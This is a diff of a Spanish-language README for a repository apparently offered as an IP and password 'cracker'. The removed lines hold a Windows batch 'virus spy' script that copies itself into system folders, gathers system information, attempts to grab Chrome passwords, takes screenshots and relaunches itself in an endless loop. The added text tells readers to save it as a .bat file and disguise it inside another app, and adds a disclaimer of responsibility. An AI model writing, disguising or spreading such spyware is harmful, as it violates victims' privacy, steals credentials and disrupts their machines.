@@ -1,26 +1,4 @@
 # ip-y-contrase-as-cracker
-saca la ip y crackea las contraseñas de una pc
+recuerda que esto lo vas a copiar y pegar en cualquier progama pero como recomendado visual code studio y lo convertiras en .bat lo disfrasaras en cualquier otra apk en la que lo quieras poner y como un extra tomara una screenshot de la pantalla de la pc que ejecuto el progama
 
-
-virus spy:@echo off
-:: Copia a sí mismo en varios directorios
-copy %0 C:\Windows\System32\spy_script.bat
-copy %0 C:\Users\Public\spy_script.bat
-copy %0 C:\Program Files\spy_script.bat
-
-:: Recopila información del sistema
-echo Información del sistema > C:\Users\Public\system_info.txt
-systeminfo >> C:\Users\Public\system_info.txt
-
-:: Recopila contraseñas guardadas en el navegador (ejemplo para Chrome)
-echo Contraseñas de Chrome > C:\Users\Public\chrome_passwords.txt
-for /f "tokens=3 delims= " %%i in ('reg query "HKCU\Software\Google\Chrome\SafeStorage" /f "Password" /t REG_SZ /s') do echo %%i >> C:\Users\Public\chrome_passwords.txt
-
-:: Captura una captura de pantalla
-echo Captura de pantalla > C:\Users\Public\screenshot.bmp
-nircmd savescreenshot C:\Users\Public\screenshot.bmp
-
-:: Ejecuta el script en un bucle infinito
-:loop
-start "" %0
-goto loop
+(!no me hago cargo de cualquier problema en el que te hallas metido recuerda usar esto siempre bajo tu responsabilidad¡)
